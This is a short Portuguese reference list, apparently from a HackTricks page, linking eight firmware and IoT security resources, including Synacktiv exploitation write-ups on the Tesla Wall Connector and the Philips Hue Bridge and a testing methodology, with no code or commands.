- [1] [Cracking de Firmware com Claude: Habilidade de Nível Sênior, Autonomia de Nível Júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia de Testes de Segurança de Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking Prático de IoT: O Guia Definitivo para Atacar a Internet das Coisas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explorando zero days em hardware abandonado – blog da Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Como um Dispositivo Inteligente de US$ 20 Me Deu Acesso à Sua Casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Agora Você Vê mi: Agora Você Está Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explorando o Tesla Wall Connector pelo conector de sua porta de carregamento - Parte 2: contornando o anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faça-o Piscar: Exploração Over-the-Air da Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
